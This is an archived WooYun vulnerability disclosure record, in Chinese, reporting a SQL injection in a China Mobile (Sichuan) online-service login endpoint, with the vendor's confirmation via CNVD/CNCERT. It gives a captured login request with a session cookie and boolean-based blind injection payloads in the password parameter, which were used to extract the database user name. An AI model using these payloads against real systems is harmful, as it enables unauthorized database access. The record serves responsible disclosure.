{"id": 84996, "wybug_id": "wooyun-2016-0171340", "wybug_title": "中国移动（四川省）某站存在SQL注入漏洞", "wybug_corp": "中国移动", "wybug_author": "路人甲", "wybug_date": "2016-01-20 14:09", "wybug_open_date": "2016-03-07 10:49", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "12", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-01-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-01-22：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-02-01：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-02-11：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-02-21：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-03-07：\t细节向公众公开  简要描述：  详细说明：  http://**.**.**.**/service/fee/zxkf.shtml\n\n点击在线咨询会跳转到**.**.**.**:16500/ocs_gz/modules/customer/ocs.jsp\n\n当链接为**.**.**.**:16500/ocs_gz/modules会自动跳转到**.**.**.**:16500/ocs_gz/index.jsp\n\n但是发现无论输入什么都提示null抓包\nGET /ocs_gz/ActionService/**.**.**.**mon.LoginAction?Action=loginIn&M=0.02473225058181716&CHANNEL_ID=1&EventID=1&IP_ADDR=xxxx&LOGIN_PSWD=1&LOGIN_USRNAME=0010&MAC_ADDR=123456 HTTP/1.1Host: **.**.**.**:16500User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:43.0) Gecko/20100101 Firefox/43.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateCookie: AICCOL_USER_ID=SCBY7768; SESS_ATTR_ACCESS_PORT=\"XXXXXXXXX(**.**.**.**):16500/ocs_gz\"; JSESSIONID=620771E424EE59AFB3DA95EB1FB961A2Connection: keep-alive\n\n**.**.**.**:16500/ocs_gz/ActionService/**.**.**.**mon.LoginAction?Action=loginIn&M=0.02473225058181716&CHANNEL_ID=1&EventID=1&IP_ADDR=xxxx&LOGIN_PSWD=1&LOGIN_USRNAME=0010&MAC_ADDR=123456\n\n\n\n\n\n\n表示登录成功但是使用这个密码登录的话还是登录不了查看源码view-source:**.**.**.**:16500/ocs_gz/\nwindow.location.href = \"**.**.**.**:16500/ocs_gz/succeed.jsp\";\n登录成功跳转**.**.**.**:16500/ocs_gz/succeed.jsp这里浏览器输入地址**.**.**.**:16500/ocs_gz/succeed.jsp\n\n虽然登录成功可惜什么都没接下来看看sql注入   漏洞证明：  \n**.**.**.**:16500/ocs_gz/ActionService/**.**.**.**mon.LoginAction?Action=loginIn&M=0.02473225058181716&CHANNEL_ID=1&EventID=1&IP_ADDR=xxxx&LOGIN_PSWD=0010'or length(user)>1 and'a'='a&LOGIN_USRNAME=0010&MAC_ADDR=123456**.**.**.**:16500/ocs_gz/ActionService/**.**.**.**mon.LoginAction?Action=loginIn&M=0.02473225058181716&CHANNEL_ID=1&EventID=1&IP_ADDR=xxxx&LOGIN_PSWD=0010'or length(user)=7 and'a'='a&LOGIN_USRNAME=0010&MAC_ADDR=123456**.**.**.**:16500/ocs_gz/ActionService/**.**.**.**mon.LoginAction?Action=loginIn&M=0.02473225058181716&CHANNEL_ID=1&EventID=1&IP_ADDR=xxxx&LOGIN_PSWD=0010'or length(user)=7 and'a'='a&LOGIN_USRNAME=0010&MAC_ADDR=123456**.**.**.**:16500/ocs_gz/ActionService/**.**.**.**mon.LoginAction?Action=loginIn&M=0.02473225058181716&CHANNEL_ID=1&EventID=1&IP_ADDR=xxxx&LOGIN_PSWD=0010'or substr('a',1,1)='a' and'a'='a&LOGIN_USRNAME=0010&MAC_ADDR=123456\n以上都返回1从以上的结果可以说明用户长度为7   获取长度用length  截取用substr接下来跑一下\n\n\n1 972 1053 974 1005 1096 1057 110\nuser为aiadmin验证一下\n**.**.**.**:16500/ocs_gz/ActionService/**.**.**.**mon.LoginAction?Action=loginIn&M=0.02473225058181716&CHANNEL_ID=1&EventID=1&IP_ADDR=*****&LOGIN_PSWD=0010'or lower(user)='aiadmin' and'a'='a&LOGIN_USRNAME=0010&MAC_ADDR=123456\n\n\n   修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2016-01-22 10:46 厂商回复： CNVD确认并复现所述情况，已经转由CNCERT向中国移动集团公司通报，由其后续协调网站管理部门处置。  最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}